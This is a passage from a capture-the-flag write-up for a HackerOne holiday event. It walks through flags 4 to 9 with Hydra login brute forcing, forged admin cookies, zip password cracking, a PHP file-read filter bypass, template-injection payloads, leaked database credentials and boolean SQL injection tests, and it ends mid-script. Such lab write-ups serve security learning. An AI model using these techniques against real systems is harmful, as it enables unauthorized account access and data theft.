<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ python3 arjun.py -u https://hackyholidays.h1ctf.com/swag-shop/api/user -w params.txt</span><br><span class="line">    _</span><br><span class="line">   /_| _ &#x27;</span><br><span class="line">  (  |/ /(//) v2.0-beta</span><br><span class="line">      _/</span><br><span class="line"></span><br><span class="line">[*] Probing the target for stability</span><br><span class="line">[*] Analysing HTTP response for anomalies</span><br><span class="line">[*] Analysing HTTP response for potential parameter names</span><br><span class="line">[*] Logicforcing the URL endpoint</span><br><span class="line">[✓] name: uuid, factor: http code</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>With the parameter <code>uuid</code> found, going to <strong>/api/user?uuid=</strong>, we’re faced with another error message:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;:&quot;Could not find matching uuid&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>So the next step is to find the missing value for the parameter <code>uuid</code>.<br>Checking the endpoint <strong>/api/sessions</strong> we see users sessions that look like <strong>base64 encoded</strong>.<br /><br>Once <strong>base64 decoded</strong> we get :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ cat sessions.txt | base64 -d</span><br><span class="line">&#123;&quot;user&quot;:null,&quot;cookie&quot;:&quot;YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU=&quot;&#125;</span><br><span class="line">&#123;&quot;user&quot;:null,&quot;cookie&quot;:&quot;ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ=&quot;&#125;</span><br><span class="line">&#123;&quot;user&quot;:&quot;C7DCCE-0E0DAB-B20226-FC92EA-1B9043&quot;,&quot;cookie&quot;:&quot;NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=&quot;&#125;</span><br><span class="line">&#123;&quot;user&quot;:null,&quot;cookie&quot;:&quot;MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE=&quot;&#125;</span><br><span class="line">&#123;&quot;user&quot;:null,&quot;cookie&quot;:&quot;M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y=&quot;&#125;</span><br><span class="line">&#123;&quot;user&quot;:null,&quot;cookie&quot;:&quot;MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ=&quot;&#125;</span><br><span class="line">&#123;&quot;user&quot;:null,&quot;cookie&quot;:&quot;OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>And with this, we find our missing <code>uuid</code> value.<br /><br>Now, accessing the user endpoint with our new value <code>/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043</code> leads us to find our fourth flag :</p>
<p><img src="/images/hackerone-ctf/flag4_flag.png" alt="Flag 4 Flag"></p>
<h3 id="Flag-5-Secure-Login"><a href="#Flag-5-Secure-Login" class="headerlink" title="Flag 5 | Secure Login"></a>Flag 5 | Secure Login</h3><p>For this challenge our goal is the following :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Try and find a way past the login page to get to the secret area.</span><br></pre></td></tr></table></figure>

<p>So once into the challenge, we see a <strong>login form</strong>. Trying some basic credentials we get our first hint, an error message saying <strong>Invalid Username</strong>.<br>This type of error screams <strong>User Enumeration/Brute Force</strong>, so we start a brute force attack with <strong>Hydra</strong> :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ hydra -L names.txt -p 123 hackyholidays.h1ctf.com https-post-form &quot;/secure-login:username=^USER^&amp;password=^PASS^:Invalid Username&quot;</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-26 18:32:37</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task</span><br><span class="line">[DATA] attacking http-post-forms://hackyholidays.h1ctf.com:443/secure-login:username=^USER^&amp;password=^PASS^:Invalid Username</span><br><span class="line">[443][http-post-form] host: hackyholidays.h1ctf.com   login: access   password: 123</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure>

<p>Now that we have the user <code>access</code>, it’s time to brute force the password :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ hydra -l access -P rockyou.txt hackyholidays.h1ctf.com https-post-form &quot;/secure-login:username=^USER^&amp;password=^PASS^:Invalid Password&quot;</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-26 18:46:06</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task</span><br><span class="line">[DATA] attacking http-post-forms://hackyholidays.h1ctf.com:443/secure-login:username=^USER^&amp;password=^PASS^:Invalid Password</span><br><span class="line">[443][http-post-form] host: hackyholidays.h1ctf.com   login: access   password: computer</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure>

<p>With the credencials found <code>access:computer</code>, once logged in we face a message saying <strong>No Files To Download</strong> :</p>
<p><img src="/images/hackerone-ctf/flag5_login.png" alt="Flag 5 Login"></p>
<p>Checking the website cookies we find <code>securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D</code>.<br /><br>It seems to be base64 so once decoded we get :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ echo &quot;eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D&quot; | base64 -d</span><br><span class="line">&#123;&quot;cookie&quot;:&quot;1b5e5f2c9d58a30af4e16a71a45d0172&quot;,&quot;admin&quot;:false&#125;base64: invalid input</span><br></pre></td></tr></table></figure>

<p>The cookie seems strange for 2 reasons : </p>
<ul>
<li>It seems corrupted at the end</li>
<li>The admin value is false</li>
</ul>
<p>So removing the <strong>%3D</strong> part at the end of the cookie, turning <code>&quot;admin&quot;:false --&gt; &quot;admin&quot;:true</code> and encoding it with base64, we get :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ echo &#x27;&#123;&quot;cookie&quot;:&quot;1b5e5f2c9d58a30af4e16a71a45d0172&quot;,&quot;admin&quot;:true&#125;&#x27; | base64</span><br><span class="line">eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo=</span><br></pre></td></tr></table></figure>

<p>By changing the cookie value with our new one, we get access to a zip file <code>my_secure_files_not_for_you.zip</code> :</p>
<p><img src="/images/hackerone-ctf/flag5_file.png" alt="Flag 5 File"></p>
<p>If we try to unzip the file, it asks for a password.<br /><br>Now, we don’t have the password so let’s use <strong>fcrackzip</strong> to crack it!</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ fcrackzip -u -D -p rockyou.txt my_secure_files_not_for_you.zip</span><br><span class="line">PASSWORD FOUND!!!!: pw == hahahaha</span><br></pre></td></tr></table></figure>

<p>Unzipping the file with our password <code>hahahaha</code> we can now retrieve our fifth flag.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ unzip -P hahahaha my_secure_files_not_for_you.zip</span><br><span class="line">Archive:  my_secure_files_not_for_you.zip</span><br><span class="line">  inflating: xxx.png</span><br><span class="line"> extracting: flag.txt</span><br><span class="line">castilho@box:~$ cat flag.txt</span><br><span class="line">flag&#123;2e6f9bf8-fdbd-483b-8c18-bdf371b2b004&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Flag-6-My-Diary"><a href="#Flag-6-My-Diary" class="headerlink" title="Flag 6 | My Diary"></a>Flag 6 | My Diary</h3><p>Starting out, our goal for this challenge is :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hackers! It looks like the Grinch has released his Diary on Grinch Networks.</span><br><span class="line">We know he has an upcoming event but he hasn&#x27;t posted it on his calendar.</span><br><span class="line">Can you hack his diary and find out what it is?</span><br></pre></td></tr></table></figure>

<p>As always, we start out by making a quick scan with ffuf :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ ffuf -u https://hackyholidays.h1ctf.com/my-diary/FUZZ -w common.txt</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : https://hackyholidays.h1ctf.com/my-diary/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: common.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]</span><br><span class="line">:: Progress: [4661/4661] :: Job [1/1] :: 424 req/sec :: Duration: [0:00:11] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>

<p>Accessing <code>/my-diary/?template=index.php</code> we get a blank page, but if we check the source code, we get the PHP code running behind the <code>/?template=</code> parameter:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;template&quot;</span>])  ) &#123; <span class="comment">// Check if template GET param has a value</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&quot;template&quot;</span>];                          <span class="comment">// Get template param value into $page</span></span><br><span class="line">    <span class="variable">$page</span> = preg_replace(<span class="string">&#x27;/([^a-zA-Z0-9.])/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$page</span>); <span class="comment">// Remove all the characters except a-z, A-Z, 0-9 and .</span></span><br><span class="line">    <span class="variable">$page</span> = str_replace(<span class="string">&quot;admin.php&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$page</span>);          <span class="comment">// Remove substring &quot;admin.php&quot; from $page</span></span><br><span class="line">    <span class="variable">$page</span> = str_replace(<span class="string">&quot;secretadmin.php&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$page</span>);    <span class="comment">// Remove substring &quot;secretadmin.php&quot; from $page</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( file_exists(<span class="variable">$page</span>) ) &#123;                         <span class="comment">// Check if page $page exists</span></span><br><span class="line">       <span class="keyword">echo</span> file_get_contents(<span class="variable">$page</span>);                   <span class="comment">// If the page exists, show the contents of it</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                                            </span><br><span class="line">        header(<span class="string">&quot;Location: /my-diary/?template=entries.html&quot;</span>); <span class="comment">// If not, returns to the home page</span></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: /my-diary/?template=entries.html&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>So, our goal here is to show the contents of <strong>secretadmin.php</strong>, but before that, we need to bypass some filters.<br>The 3 filters that we’re working with are the following:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&#x27;/([^a-zA-Z0-9.])/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,input); <span class="comment">// Remove all the characters except a-z, A-Z, 0-9 and .</span></span><br><span class="line">str_replace(<span class="string">&quot;admin.php&quot;</span>,<span class="string">&quot;&quot;</span>,input);          <span class="comment">// Remove substring &quot;admin.php&quot; from the input</span></span><br><span class="line">str_replace(<span class="string">&quot;secretadmin.php&quot;</span>,<span class="string">&quot;&quot;</span>,input);    <span class="comment">// Remove substring &quot;secretadmin.php&quot; from the input</span></span><br></pre></td></tr></table></figure>

<p><strong>Running Example</strong></p>
<p>If we insert a simple <strong>secretadmin.php</strong>, the filters will do the following :</p>
<p><img src="/images/hackerone-ctf/flag6_example.png" alt="Flag 6 Example"></p>
<p>So our output at the end would be <code>secret</code> which is not what we are looking for as we are looking for to get <code>secretadmin.php</code>.<br /><br>Now, to bypass these 3 filters, I came up with the following payload:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretadminsecretadminadmin.php.php.php</span><br></pre></td></tr></table></figure>

<p>This looks a bit confusing at first but let me explain :</p>
<p><img src="/images/hackerone-ctf/flag6_payload.png" alt="Flag 6 Payload"></p>
<p>With our payload made, we can now insert into the <code>template</code> parameter,  <code>/?template=secretadminsecretadminadmin.php.php.php</code>.<br /><br>Accessing the endpoint, will gives the sixth flag :</p>
<p><img src="/images/hackerone-ctf/flag6_flag.png" alt="Flag 6 Flag"></p>
<h3 id="Flag-7-Hate-Mail-Generator"><a href="#Flag-7-Hate-Mail-Generator" class="headerlink" title="Flag 7 | Hate Mail Generator"></a>Flag 7 | Hate Mail Generator</h3><p>Entering the challenge, we get the goal :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! </span><br><span class="line">Try and find the hidden flag!</span><br></pre></td></tr></table></figure>

<p>Making the normal ffuf scan gets us the endpoints <code>/templates</code> and <code>/new</code> :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ ffuf -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -w common.txt</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: common.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]</span><br><span class="line">templates               [Status: 302, Size: 0, Words: 1, Lines: 1]</span><br><span class="line">:: Progress: [4661/4661] :: Job [1/1] :: 424 req/sec :: Duration: [0:00:11] :: Errors: 0 ::</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Checking <code>/templates</code> shows the templates that we can use in our email :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cbdj3_grinch_header.html</span><br><span class="line">cbdj3_grinch_footer.html</span><br><span class="line">38dhs_admins_only_header.html     </span><br></pre></td></tr></table></figure>

<p>When trying to open the templates in the browser we encounter a <code>403 Forbidden</code> status code, so we have to find another way to see the contents of the admin’s template.<br /><br>Also, while exploring the <code>/new</code> endpoint, we find out we can create and/or preview an email made by us! Ok great, so with our endpoints reviewed, the next step is to start exploring the app itself.</p>
<p>While exploring, we find out on the home page an already made email called <code>Guess What</code>. Reviewing the email we can see how the templates are load :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;template:cbdj3_grinch_header.html&#125;&#125; </span><br><span class="line">    Hi &#123;&#123;name&#125;&#125;..... Guess what..... &lt;strong&gt;YOU SUCK!&lt;/strong&gt;</span><br><span class="line">&#123;&#123;template:cbdj3_grinch_footer.html&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>So knowing this, we can start to find a way to load the admin’s template.<br /><br>Going again into our <code>/new</code> endpoint, when trying to insert <code>&#123;&#123;template:38dhs_admins_only_header.html&#125;&#125;</code> into the email’s body and previewing it, we get the following error:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You do not have access to the file 38dhs_admins_only_header.html    </span><br></pre></td></tr></table></figure>

<p>From this, we can determine there’s some sort of filter going on.<br /><br>Checking the <strong>preview</strong> option request with BurpSuite we can find 2 parameters with default values:</p>
<ul>
<li> <strong>preview_markup</strong> with the value = <code>Hello &#123;&#123;name&#125;&#125; ....</code></li>
<li> <strong>preview_data</strong> with the value = <code>&#123;&quot;name&quot;:&quot;Alice&quot;,&quot;email&quot;:&quot;alice@test.com&quot;&#125;</code></li>
</ul>
<p>And when previewing the email, we get <code>Hello Alice ....</code>, so we know that he’s getting the value of the JSON parameter <code>name</code> and printing it out.<br /><br>So to bypass this filter, we can use the JSON variables to store our template payload and then calling them out, like so:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preview_markup=&#123;&#123;open&#125;&#125;template:&#123;&#123;template_name&#125;&#125;&#123;&#123;close&#125;&#125;&amp;preview_data=&#123;&quot;template_name&quot;:&quot;38dhs_admins_only_header.html&quot;,&quot;open&quot;:&quot;&#123;&#123;&quot;,&quot;close&quot;:&quot;&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>Sending the payload above, we overcome the filter and got our selfs the seventh flag :</p>
<p><img src="/images/hackerone-ctf/flag7_flag.png" alt="Flag 7 Flag"></p>
<h3 id="Flag-8-Forum"><a href="#Flag-8-Forum" class="headerlink" title="Flag 8 | Forum"></a>Flag 8 | Forum</h3><p>Our information for the challenge is the following :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The Grinch thought it might be a good idea to start a forum but nobody really wants to chat with him.</span><br><span class="line">He keeps his best posts in the Admin section but you&#x27;ll need a valid login to access that!</span><br></pre></td></tr></table></figure>

<p>Running ffuf as usual, we’ll get us the following endpoints, <code>/login</code> and <code>/phpmyadmin</code>.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ ffuf -u https://hackyholidays.h1ctf.com/forum/FUZZ -w common.txt</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : https://hackyholidays.h1ctf.com/forum/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: common.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]</span><br><span class="line">phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]</span><br><span class="line">:: Progress: [4661/4661] :: Job [1/1] :: 424 req/sec :: Duration: [0:00:11] :: Errors: 0 ::</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>While exploring the rest of the app, a forum post led me to find <strong>2 users</strong>:</p>
<ul>
<li>grinch</li>
<li>max</li>
</ul>
<p>After that, tried to brute force my way into <strong>/phpmyadmin</strong> and <strong>/login</strong>, but no success.<br /><br>Checking the name’s company <strong>Grinch-Networks</strong> on <strong>GitHub</strong> we can find a repository with the forum source code: <a target="_blank" rel="noopener" href="https://github.com/Grinch-Networks/forum">Grinch Networks Forum Source Code</a><br /><br>Reviewing the repository commits led me to find the <strong>small fix</strong> commit which was leaking the credentials of the <strong>DB</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">self</span>::<span class="variable">$read</span> = <span class="keyword">new</span> DbConnect( <span class="literal">false</span>, <span class="string">&#x27;forum&#x27;</span>, <span class="string">&#x27;forum&#x27;</span>,<span class="string">&#x27;6HgeAZ0qC9T6CQIqJpD&#x27;</span> );</span><br></pre></td></tr></table></figure>

<p>With this credentials, we can now login into our <strong>/phpmyadmin</strong> endpoint and get the password hash of the Admin from the <strong>user</strong> Table:  </p>
<p><img src="/images/hackerone-ctf/flag8_password_hash.png" alt="Flag 8 Hash"></p>
<p>The next step is to crack the <strong>MD5 Hash</strong>, so for this, I’ll be using <a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35D652126CA1706B59DB02C93E0C9FBF --&gt; BahHumbug</span><br></pre></td></tr></table></figure>

<p>Now to retrieve our eighth flag, we just have to login into the <strong>/login</strong> endpoint with our credentials <code>grinch:BahHumbug</code> and read the <strong>Secret Plans</strong> forum post :</p>
<p><img src="/images/hackerone-ctf/flag8_flag.png" alt="Flag 8 Flag"></p>
<h3 id="Flag-9-Evil-Quiz"><a href="#Flag-9-Evil-Quiz" class="headerlink" title="Flag 9 | Evil Quiz"></a>Flag 9 | Evil Quiz</h3><p>Reading the challenge information we can guess that we need to get somehow into the admin’s area :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Just how evil are you? Take the quiz and see! Just don&#x27;t go poking around the admin area!</span><br></pre></td></tr></table></figure>

<p>Making the usual scan with ffuf doesn’t get us any leads so let’s start exploring the app itself.<br /><br>The quiz is composed of 3 stages :</p>
<ul>
<li><strong>Your Name</strong> - Insert our name</li>
<li><strong>Quiz</strong> - Fill out form</li>
<li><strong>Score</strong> - Says how evil we are</li>
</ul>
<p><img src="/images/hackerone-ctf/flag9_quiz.png" alt="Flag 9 Quizz"></p>
<p>After a bit of tampering we can find out that the vulnerability lays on the <strong>name</strong> input that is vulnerable to <strong>Boolean-based SQL Injection</strong>. To confirm this, we can insert the following payloads:</p>
<ul>
<li>Input = <code>castilho&#39; or 1=0;</code> -| Output = <code>There is 0 other player(s) ...</code></li>
<li>Input = <code>castilho&#39; or 1=1;</code> -| Output = <code>There is 1211189 other player(s) ...</code></li>
</ul>
<p><img src="/images/hackerone-ctf/flag9_quiz_payload.png" alt="Flag 9 Payload"></p>
<p>To exploit this issue sure we could use <strong>sqlmap</strong>, but why not make our own script to retrieve data from the <strong>DB</strong> and learn a bit along the way ?<br /><br>So after a while, I was done with my <strong>Flag 9</strong> Python script :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Cookies and headers</span></span><br><span class="line">target  = <span class="string">&quot;https://hackyholidays.h1ctf.com/evil-quiz&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,<span class="string">&quot;Cookie&quot;</span>:<span 